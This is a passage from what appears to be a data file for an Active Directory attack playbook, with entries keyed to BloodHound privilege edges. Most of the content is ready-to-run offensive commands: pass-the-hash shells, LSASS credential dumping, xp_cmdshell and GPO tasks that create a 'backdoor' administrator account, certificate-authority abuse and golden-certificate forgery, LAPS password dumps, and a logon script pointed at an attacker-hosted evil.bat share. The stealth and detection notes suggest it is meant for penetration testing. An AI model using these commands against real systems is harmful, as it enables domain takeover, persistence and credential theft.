  {n:5,t:'Quick dump via nxc',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> --sam --lsa',note:'Faster combo for SAM+LSA.'},
  {n:6,t:'Interactive shell — wmiexec (stealthy)',cmd:'wmiexec.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP>',note:'No service creation — quieter than psexec.'},
  {n:7,t:'Interactive shell — psexec (SYSTEM)',cmd:'psexec.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP>',note:'Gets SYSTEM. Creates a service — noisy.'},
  {n:8,t:'Pass-the-Hash (no password)',cmd:'wmiexec.py -hashes :\'<NTHASH>\' \'<DOMAIN>/<USER>\'@<TARGET_IP>',note:'Format: -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH'}
 ],
 opsec:['psexec = Event ID 7045 (service install)','wmiexec = Event ID 4688 from wmiprvse.exe','secretsdump = Event ID 5145 (share access)','LSASS access = Sysmon Event ID 10']},

// ── CANPSREMOTE ───────────────────────────────────────────────
{id:'canpsremote',cat:'exec',icon:'⚡',name:'CanPSRemote → WinRM / PowerShell Remoting',impact:'high',noise:'medium',
 prereq:'Member of Remote Management Users group, or local admin (CanPSRemote edge in BloodHound)',
 desc:'<strong>What:</strong> WinRM (port 5985/5986) gives interactive PowerShell sessions. evil-winrm provides upload/download, AMSI bypass, and pass-the-hash support.',
 steps:[
  {n:1,t:'Verify WinRM access',cmd:'nxc winrm <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN>',note:'"Pwn3d!" = WinRM access confirmed.'},
  {n:2,t:'Interactive PowerShell session',cmd:'evil-winrm -i <TARGET_IP> -u <USER> -p \'<PASS>\'',note:'Full interactive PS session with upload/download/AMSI bypass.'},
  {n:3,t:'Pass-the-Hash WinRM',cmd:'evil-winrm -i <TARGET_IP> -u <USER> -H <NTHASH>',note:'NT hash — no plaintext password needed.'},
  {n:4,t:'Kerberos auth WinRM',cmd:'evil-winrm -i <TARGET_IP> -r <DOMAIN>',note:'Uses current KRB5CCNAME.'},
  {n:5,t:'Remote command (non-interactive)',cmd:'nxc winrm <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'whoami /all\'',note:'Single command execution.'}
 ],
 opsec:['WinRM logon = Event ID 4624 type 3','wsmprovhost.exe = Event ID 4688','Prefer over psexec for stealth']},

// ── CANRDP ────────────────────────────────────────────────────
{id:'canrdp',cat:'exec',icon:'🖥️',name:'CanRDP → Remote Desktop Access',impact:'high',noise:'high',
 prereq:'Member of Remote Desktop Users or local admin (CanRDP edge in BloodHound)',
 desc:'<strong>What:</strong> RDP (port 3389) gives a full GUI desktop session. Highest-noise lateral movement option — creates visible session and multiple event logs.',
 steps:[
  {n:1,t:'Check RDP availability',cmd:'nmap -p 3389 <TARGET_IP> --open',note:'Verify port open.'},
  {n:2,t:'RDP with password',cmd:'xfreerdp /v:<TARGET_IP> /u:<USER> /p:\'<PASS>\' /d:<DOMAIN> /dynamic-resolution +clipboard',note:'Full GUI. +clipboard for clipboard sharing.'},
  {n:3,t:'Pass-the-Hash RDP (Restricted Admin mode required)',cmd:'xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTHASH> /d:<DOMAIN> /dynamic-resolution',note:'Requires Restricted Admin mode enabled on target.'},
  {n:4,t:'Enable Restricted Admin mode (needs existing code exec)',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f\'',note:'Enables PtH RDP. Registry change is detectable.'},
  {n:5,t:'Check existing sessions',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'query session\'',note:'List active sessions. Hijack admin session if SYSTEM access available.'}
 ],
 opsec:['RDP logon = Event ID 4624 type 10','Session visible in Task Manager','Prefer WinRM/WMI when stealth is required']},

// ── EXECUTEDCOM ───────────────────────────────────────────────
{id:'executedcom',cat:'exec',icon:'⚙️',name:'ExecuteDCOM → DCOM Lateral Movement',impact:'high',noise:'medium',
 prereq:'Local admin on target machine (ExecuteDCOM edge in BloodHound)',
 desc:'<strong>What:</strong> DCOM allows remote execution via COM objects (MMC20.Application, ShellWindows, ShellBrowserWindow). Less monitored than SMB-based execution.',
 steps:[

  {n:2,t:'Semi-interactive DCOM shell',cmd:'dcomexec.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP> -object MMC20',note:'Interactive DCOM shell.'},
  {n:3,t:'Pass-the-Hash DCOM',cmd:'dcomexec.py -hashes :\'<NTHASH>\' \'<DOMAIN>/<USER>\'@<TARGET_IP> \'whoami\' -object MMC20',note:'NT hash auth.'},
  {n:4,t:'Execute payload',cmd:'dcomexec.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP> \'powershell -enc <BASE64_PAYLOAD>\' -object MMC20',note:'Base64-encoded PS payload.'},
  {n:5,t:'Alternative: nxc wmi',cmd:'nxc wmi <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'whoami\'',note:'nxc WMI module.'}
 ],

// ── SQLADMIN ──────────────────────────────────────────────────
{id:'sqladmin',cat:'exec',icon:'🗄️',name:'SQLAdmin → MSSQL Command Execution',impact:'critical',noise:'medium',
 prereq:'sysadmin role on MSSQL instance (SQLAdmin edge in BloodHound)',
 desc:'<strong>What:</strong> SQL Server sysadmin = OS command execution via xp_cmdshell. SQL service account often has domain privileges. Check linked servers for further lateral movement.',
 steps:[
  {n:1,t:'Find MSSQL instances via SPNs',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(servicePrincipalName=MSSQLSvc*)\' --attr sAMAccountName,servicePrincipalName',note:'MSSQLSvc/hostname:port'},
  {n:2,t:'Test MSSQL access',cmd:'nxc mssql <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN>',note:'"Pwn3d!" = sysadmin.'},
  {n:3,t:'Connect and enable xp_cmdshell',cmd:'mssqlclient.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP> -windows-auth -x',note:'-x auto-enables xp_cmdshell.'},
  {n:4,t:'Execute OS commands',cmd:'# After connecting:\nEXEC xp_cmdshell \'whoami\';\nEXEC xp_cmdshell \'net user backdoor <NEWPASS> /add && net localgroup administrators backdoor /add\';',note:'Runs as SQL service account.'},
  {n:5,t:'Check linked servers for lateral movement',cmd:'# In mssqlclient:\nSELECT name FROM sys.servers WHERE is_linked = 1;\nEXEC (\'EXEC xp_cmdshell \\\'whoami\\\'\') AT [LINKED_SERVER_NAME]',note:'Linked servers extend reach to other SQL instances.'},
  {n:6,t:'Quick command via nxc',cmd:'nxc mssql <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'whoami\'',note:'One-liner.'}
 ],
 opsec:['xp_cmdshell = Event ID 4688 child of sqlservr.exe','enable/disable xp_cmdshell logged in SQL audit']},

// ── HASSESSION ────────────────────────────────────────────────
{id:'hassession',cat:'exec',icon:'👁️',name:'HasSession → Credential Harvesting from Sessions',impact:'high',noise:'medium',
 prereq:'Local admin on a machine where a high-value user has an active session (HasSession edge in BloodHound)',
 desc:'<strong>What:</strong> HasSession = a high-value user (DA, admin) is logged into a machine you control. Dump their credentials from LSASS memory.<br><br>BloodHound collects session data periodically — sessions may have ended. Verify first.',
 steps:[
  {n:1,t:'Find machines with high-value sessions',cmd:'nxc smb <SUBNET>/24 -u <USER> -p \'<PASS>\' -d <DOMAIN> --loggedon-users',note:'Scan subnet for logged-in users. Look for domain admins.'},
  {n:2,t:'Check specific machine sessions',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> --sessions',note:'Lists active SMB sessions on this machine.'},
  {n:3,t:'Dump LSASS via lsassy (best option)',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -M lsassy',note:'Extracts plaintext passwords from LSASS. Uses handle duplication — slightly less detectable.'},
  {n:4,t:'Full credential dump',cmd:'secretsdump.py \'<DOMAIN>/<USER>:<PASS>\'@<TARGET_IP>',note:'SAM + LSA + cached creds.'},
  {n:5,t:'Manual LSASS mini-dump (stealthier)',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\\\Windows\\\\Temp\\\\l.dmp full\'',note:'Creates dump file. Analyze offline with mimikatz.'}
 ],
 opsec:['LSASS access = Sysmon Event ID 10 (most common detection)','lsassy handle duplication = slightly less obvious','Session data from BloodHound may be stale — verify before wasting time']},

// ── GPO LINK ──────────────────────────────────────────────────
{id:'gplink',cat:'privesc',icon:'📋',name:'WriteGPLink → Malicious GPO Linking',impact:'critical',noise:'high',
 prereq:'WriteProperty on gPLink attribute of an OU (or GenericAll/WriteDACL on OU) AND write access to a GPO',
 desc:'<strong>What:</strong> Write gPLink on an OU = link a malicious GPO to it. All computers/users in the OU receive the policy at next gpupdate (up to 90 min).<br><br><strong>Chain:</strong> Find/create writable GPO → modify it (add scheduled task as SYSTEM) → link to target OU via gPLink.',
 steps:[
  {n:1,t:'Find OUs with writable gPLink',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get writable --otype OU --right WRITE --detail',note:'Look for write access to gPLink attribute.'},
  {n:2,t:'Find writable GPOs',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(objectClass=groupPolicyContainer)\' --attr cn,displayName,gPCFileSysPath',note:'Get GPO GUIDs and SYSVOL paths. Check write access: nxc smb <HOST> -u <USER> -p <PASS> -d <DOMAIN> -M spider_plus -o SHARE=SYSVOL'},
  {n:3,t:'Modify GPO: add scheduled task (runs as SYSTEM)',cmd:'# Modify: \\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\{<GPO_GUID>}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n# Task: cmd.exe /c net user backdoor <NEWPASS> /add && net localgroup administrators backdoor /add',note:'Machine Preferences Scheduled Tasks run as SYSTEM on computer startup/gpupdate.'},
  {n:4,t:'Link GPO to target OU',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object \'OU=<OU_NAME>,DC=<DOMAIN>,DC=com\' gPLink -v \'[LDAP://cn={<GPO_GUID>},cn=policies,cn=system,DC=<DOMAIN>,DC=com;0]\'',note:'Format: [LDAP://GPO_DN;Link_Options] — 0=enabled, 2=enforced.'},
  {n:5,t:'Force GPO refresh (if code exec available)',cmd:'nxc smb <TARGET_IP> -u <USER> -p \'<PASS>\' -d <DOMAIN> -x \'gpupdate /force\'',note:'Immediate instead of waiting up to 90 minutes.'},
  {n:6,t:'🧹 CLEANUP: Remove GPO link',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object \'OU=<OU_NAME>,DC=<DOMAIN>,DC=com\' gPLink',note:'No -v = delete gPLink (unlinks all GPOs from this OU).',cleanup:true}
 ],
 opsec:['GPO modification = Event ID 5136','gPLink write = Event ID 5136 on DC','Policy application on endpoint = Event ID 4657','Clean up immediately — linked GPO keeps applying until unlinked']},

// ── MANAGE CA (ESC7) ──────────────────────────────────────────
{id:'manageca',cat:'adcs',icon:'🏛️',name:'ManageCA → ESC7 Certificate Authority Abuse',impact:'critical',noise:'high',
 prereq:'ManageCA right on the CA object (CA Administrator role)',
 desc:'<strong>What:</strong> ManageCA = CA Administrator. Allows granting yourself ManageCertificates (approve pending requests). Chain: grant yourself officer → request cert with admin SAN (pending) → approve → authenticate as DA.',
 steps:[
  {n:1,t:'Confirm ManageCA via certipy',cmd:'certipy find -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST> -vulnerable -stdout',note:'Look for "ManageCA: True" in certipy ESC7 output.'},
  {n:2,t:'Add yourself as CA Officer (ManageCertificates)',cmd:'certipy ca -ca \'<CA_NAME>\' -add-officer <USER> -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST>',note:'CA Officers can approve/deny pending certificate requests.'},
  {n:3,t:'Request cert with Administrator SAN (will be PENDING)',cmd:'certipy req -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -ca \'<CA_NAME>\' -target <CA_SERVER> -template SubCA -upn \'administrator@<DOMAIN>\' -dc-ip <HOST>',note:'Note the request ID in output. Request is pending approval.'},
  {n:4,t:'Issue/approve the pending request',cmd:'certipy ca -ca \'<CA_NAME>\' -issue-request <REQUEST_ID> -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST>',note:'Approve your own certificate request as CA Officer.'},
  {n:5,t:'Retrieve cert and authenticate',cmd:'certipy req -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -ca \'<CA_NAME>\' -target <CA_SERVER> -retrieve <REQUEST_ID> -dc-ip <HOST> && certipy auth -pfx administrator.pfx -dc-ip <HOST>',note:'Download cert then PKINIT auth. Gets NT hash.'},
  {n:6,t:'🧹 CLEANUP: Remove officer role',cmd:'certipy ca -ca \'<CA_NAME>\' -remove-officer <USER> -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -dc-ip <HOST>',note:'Remove CA Officer role.',cleanup:true}
 ],
 opsec:['CA config changes = Event ID 4899','Cert requests = Event ID 4886/4887','Issued certs valid until expiry — revoke after engagement']},

// ── GOLDEN CERT ───────────────────────────────────────────────
{id:'goldencert',cat:'adcs',icon:'🏆',name:'GoldenCert — CA Private Key Theft',impact:'critical',noise:'high',
 prereq:'Admin access on the CA server (via AdminTo, DA, or RDP)',
 desc:'<strong>What:</strong> Steal the CA private key. Forge valid certificates for ANY user at any time — permanent persistence surviving all password resets. Valid until CA cert expiry (typically 5-10 years).',
 steps:[
  {n:1,t:'Identify CA server',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(objectClass=pKIEnrollmentService)\' --attr cn,dNSHostName',note:'Need admin access on this machine.'},
  {n:2,t:'Backup CA cert and private key',cmd:'certipy ca -backup -u \'<USER>@<DOMAIN>\' -p \'<PASS>\' -ca \'<CA_NAME>\' -target <CA_SERVER> -dc-ip <HOST>',note:'Exports CA .pfx. Alternative on CA server: certutil -backupDB C:\\\\backup'},
  {n:3,t:'Forge certificate for Administrator',cmd:'certipy forge -ca-pfx \'<CA_NAME>.pfx\' -upn \'administrator@<DOMAIN>\' -subject \'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=com\'',note:'Creates valid cert signed by stolen CA key. No CA contact needed.'},
  {n:4,t:'Authenticate with forged cert',cmd:'certipy auth -pfx administrator_forged.pfx -dc-ip <HOST>',note:'PKINIT. certipy auto-extracts NT hash.'},
  {n:5,t:'Use NT hash',cmd:'evil-winrm -i <HOST> -u Administrator -H <NTHASH>',note:'Persistent DA access.'},
  {n:6,t:'Forge cert for any user on demand',cmd:'certipy forge -ca-pfx \'<CA_NAME>.pfx\' -upn \'<TRUSTEE>@<DOMAIN>\'',note:'Stored CA pfx = forge certs for any user forever.'}
 ],
 opsec:['CA backup = Event ID 4899 + Security Audit','Forged certs bypass all password changes','Store stolen CA pfx EXTREMELY securely']},

// ── LAPS SPRAY ────────────────────────────────────────────────
{id:'lapsspray',cat:'cred',icon:'🔑',name:'ReadLAPSPassword → LAPS Lateral Movement',impact:'high',noise:'low',
 prereq:'Read access to ms-Mcs-AdmPwd on computer objects (ReadLAPSPassword edge in BloodHound)',
 desc:'<strong>What:</strong> LAPS passwords are unique per machine. Use each for local admin on its machine → dump LSA secrets → find cached domain creds or service account passwords → escalate.',
 steps:[
  {n:1,t:'Dump all LAPS passwords',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get search --filter \'(ms-Mcs-AdmPwdExpirationTime=*)\' --attr name,ms-Mcs-AdmPwd',note:'Blank ms-Mcs-AdmPwd = no read rights on that machine.'},
  {n:2,t:'Alternative: nxc LAPS module',cmd:'nxc ldap <HOST> -u <USER> -p \'<PASS>\' -d <DOMAIN> -M laps',note:'Auto-retrieves and displays LAPS passwords with expiry.'},
  {n:3,t:'Authenticate with LAPS password (local auth)',cmd:'nxc smb <TARGET_IP> -u Administrator -p \'<LAPS_PASS>\' --local-auth',note:'--local-auth for local accounts. LAPS = LOCAL Administrator, not domain.'},
  {n:4,t:'Dump creds from LAPS machine',cmd:'secretsdump.py \'./Administrator:<LAPS_PASS>\'@<TARGET_IP>',note:'./ prefix = local account. Look for _SC_ entries = service account passwords.'},
  {n:5,t:'New LAPS (2023+) — encrypted attribute',cmd:'nxc ldap <HOST> -u <USER> -p \'<PASS>\' -d <DOMAIN> -M laps',note:'New LAPS uses ms-LAPS-EncryptedPassword. nxc handles decryption automatically.'}
 ],
 opsec:['Reading ms-Mcs-AdmPwd = Event ID 4662 if attribute auditing enabled','LAPS passwords are unique per-machine — no cross-machine reuse','--local-auth prevents Kerberos ticket generation']},

{id:'logonscript',cat:'cred',icon:'📝',name:'WriteProperty → Logon Script Injection',impact:'high',noise:'low',
 prereq:'WriteProperty on scriptPath attribute OR GenericWrite/GenericAll on target user',
 desc:'<strong>What:</strong> Set a malicious logon script on a user. Executes silently in their context on next login. No service creation. Stealthy because there is no immediate execution.',
 steps:[

  {n:2,t:'Set malicious scriptPath',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object <TARGET> scriptPath -v \'\\\\\\\\<ATTACKER_IP>\\\\share\\\\evil.bat\'',note:'UNC path to your SMB share. Executes when target logs in.'},
